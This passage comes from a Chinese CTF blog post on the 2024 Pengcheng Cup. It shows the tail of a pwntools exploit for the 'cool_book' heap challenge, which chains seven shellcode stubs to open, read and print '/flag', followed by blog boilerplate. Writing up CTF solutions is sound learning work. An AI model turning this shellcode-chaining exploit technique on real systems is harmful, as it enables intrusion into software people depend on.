class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause() </span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;addr=&#x27;</span>)</span><br><span class="line">heap=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">li(heap)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;3.exit&#x27;</span>,<span class="built_in">str</span>(a))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,con</span>):</span><br><span class="line">    choice(<span class="number">1</span>)    </span><br><span class="line">    sla(<span class="string">b&#x27;input idx&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;input content&#x27;</span>,con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)    </span><br><span class="line">    sla(<span class="string">b&#x27;input idx&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsp,rbp</span></span><br><span class="line"><span class="string">jmp rbp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov r8,0x67616c662f</span></span><br><span class="line"><span class="string">sub rbp,0x30</span></span><br><span class="line"><span class="string">jmp rbp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode3=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push r8</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">sub rbp,0x30</span></span><br><span class="line"><span class="string">jmp rbp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode4=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">sub rbp,0x30</span></span><br><span class="line"><span class="string">jmp rbp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode5=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sub rbp,0x30</span></span><br><span class="line"><span class="string">jmp rbp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode6=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">sub rbp,0x30</span></span><br><span class="line"><span class="string">jmp rbp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode7=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">         add(i,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode6))</span><br><span class="line"></span><br><span class="line">add(<span class="number">43</span>,shellcode7)</span><br><span class="line">add(<span class="number">44</span>,shellcode6)</span><br><span class="line">add(<span class="number">45</span>,shellcode5)</span><br><span class="line">add(<span class="number">46</span>,shellcode4)</span><br><span class="line">add(<span class="number">47</span>,shellcode3)</span><br><span class="line">add(<span class="number">48</span>,shellcode2)</span><br><span class="line">add(<span class="number">49</span>,shellcode1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;3.exit&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p><strong>特别感谢：</strong></p>
+<p><strong>bananaship</strong>：<a target="_blank" rel="noopener" href="https://bananashipsbbq.github.io/">tommy的妙妙屋 (bananashipsbbq.github.io)</a></p>
+<p>感谢带着复现了一手</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">bosh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/11/13/%E9%B9%8F%E7%A8%8B%E6%9D%AF-2024/">http://example.com/2024/11/13/%E9%B9%8F%E7%A8%8B%E6%9D%AF-2024/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Bosh's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/linux%E3%80%81pwn/">linux、pwn</a></div><div class="post-share"><div class="social-share" data-image="https://z-bosh.github.io/img/match4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="next-post pull-full" href="/2024/11/11/ADWP/" title="AWDP-总结笔记"><img class="cover" src="https://z-bosh.github.io/img/AWDP.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">AWDP-总结笔记</div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a href="/2024/10/20/NewStarCTF%202024/" title="NewStarCTF 2024"><img class="cover" src="https://z-bosh.github.io/img/match2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-20</div><div class="title">NewStarCTF 2024</div></div></a><a href="/2024/10/13/ctfshow-pwn%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="ctfshow-做题笔记-格式化字符串"><img class="cover" src="https://z-bosh.github.io/img/stack3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-13</div><div class="title">ctfshow-做题笔记-格式化字符串</div></div></a><a href="/2024/11/06/Polar/" title="Polar靶场-做题笔记"><img class="cover" src="https://z-bosh.github.io/img/bachang.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-06</div><div class="title">Polar靶场-做题笔记</div></div></a><a href="/2024/10/13/%E5%9F%BA%E6%9C%AC%E7%9A%84ROP/" title="基本的栈溢出"><img class="cover" src="https://z-bosh.github.io/img/stack1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-13</div><div class="title">基本的栈溢出</div></div></a><a href="/2024/10/20/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/" title="2024-强网拟态"><img class="cover" src="https://z-bosh.github.io/img/match1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-20</div><div class="title">2024-强网拟态</div></div></a><a href="/2024/10/15/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="ctfshow-做题笔记-整数安全"><img class="cover" src="https://z-bosh.github.io/img/number.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-15</div><div class="title">ctfshow-做题笔记-整数安全</div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">bosh</div><div class="author-info-description">努力学习中~</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Z-bosh"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">阿拉山口卖囊的小伙说：阿达西！买囊不？</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RE"><span class="toc-number">1.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#joyVBS-pcb2024"><span class="toc-number">1.1.</span> <span class="toc-text">joyVBS-pcb2024</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rafflesia-pcb2024"><span class="toc-number">1.2.</span> <span class="toc-text">Rafflesia-pcb2024</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE5-pcb2024"><span class="toc-number">1.3.</span> <span class="toc-text">RE5-pcb2024</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cool-book"><span class="toc-number">2.1.</span> <span class="toc-text">cool_book</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/13/%E9%B9%8F%E7%A8%8B%E6%9D%AF-2024/" title="鹏程杯-2024"><img src="https://z-bosh.github.io/img/match4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="鹏程杯-2024"/></a><div class="content"><a class="title" href="/2024/11/13/%E9%B9%8F%E7%A8%8B%E6%9D%AF-2024/" title="鹏程杯-2024">鹏程杯-2024</a><time datetime="2024-11-13T00:00:00.000Z" title="发表于 2024-11-13 00:00:00">2024-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/11/ADWP/" title="AWDP-总结笔记"><img src="https://z-bosh.github.io/img/AWDP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AWDP-总结笔记"/></a><div class="content"><a class="title" href="/2024/11/11/ADWP/" title="AWDP-总结笔记">AWDP-总结笔记</a><time datetime="2024-11-11T00:00:00.000Z" title="发表于 2024-11-11 00:00:00">2024-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/06/Polar/" title="Polar靶场-做题笔记"><img src="https://z-bosh.github.io/img/bachang.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Polar靶场-做题笔记"/></a><div class="content"><a class="title" href="/2024/11/06/Polar/" title="Polar靶场-做题笔记">Polar靶场-做题笔记</a><time datetime="2024-11-06T00:00:00.000Z" title="发表于 2024-11-06 00:00:00">2024-11-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF-2024/" title="网鼎杯-2024"><img src="https://z-bosh.github.io/img/match3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网鼎杯-2024"/></a><div class="content"><a class="title" href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF-2024/" title="网鼎杯-2024">网鼎杯-2024</a><time datetime="2024-10-30T00:00:00.000Z" title="发表于 2024-10-30 00:00:00">2024-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/22/ctfshow-%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%A0%86%E5%88%A9%E7%94%A8%C2%B7%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/" title="ctfshow-做题笔记-堆利用·前置基础"><img src="https://z-bosh.github.io/img/heap2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-做题笔记-堆利用·前置基础"/></a><div class="content"><a class="title" href="/2024/10/22/ctfshow-%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%A0%86%E5%88%A9%E7%94%A8%C2%B7%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/" title="ctfshow-做题笔记-堆利用·前置基础">ctfshow-做题笔记-堆利用·前置基础</a><time datetime="2024-10-22T00:00:00.000Z" title="发表于 2024-10-22 00:00:00">2024-10-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By bosh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
